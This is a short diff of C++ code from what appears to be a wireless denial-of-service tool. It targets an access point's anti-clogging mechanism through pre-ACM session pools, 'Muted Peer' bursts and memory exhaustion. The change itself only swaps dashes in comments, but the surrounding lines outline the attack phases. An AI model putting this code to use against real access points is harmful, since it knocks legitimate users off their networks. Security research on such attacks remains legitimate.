@@ -57,7 +57,7 @@ static void muted_peer_burst(const string &att_iface, const string &att_mac,
 				scoped_lock lock(store.mtx);
 				if(!store.queue.empty()) {
 					// prefer client_mac cookie (Muted Peer / Sync exhaustion),
-					// fall back to any (memory exhaustion) — AP often skips ACM for
+					// fall back to any (memory exhaustion) - AP often skips ACM for
 					// associated STAs so a client_mac cookie may never arrive
 					auto it = store.queue.find(client_mac);
 					if(it != store.queue.end())
@@ -142,7 +142,7 @@ void run_attack(RunStatus &rs) {
 	// Phase 1: establish pre-ACM sessions (stays in AP memory for ~300s without refresh)
 	send_pre_acm_commits(att_iface, ap_mac, pre_acm_pool, base_params);
 
-	// Phase 2: trigger ACM — with pool_size pre-ACM sessions already committed, one more
+	// Phase 2: trigger ACM - with pool_size pre-ACM sessions already committed, one more
 	// unique MAC is enough to reach acm_threshold
 	pmk_gobbler::trigger_acm(att_iface, att_iface, att.get(SK::mac), ap_mac,
 		acm_pause_ms, acm_trigger_count, base_params, static_cast<int>(burst_size));
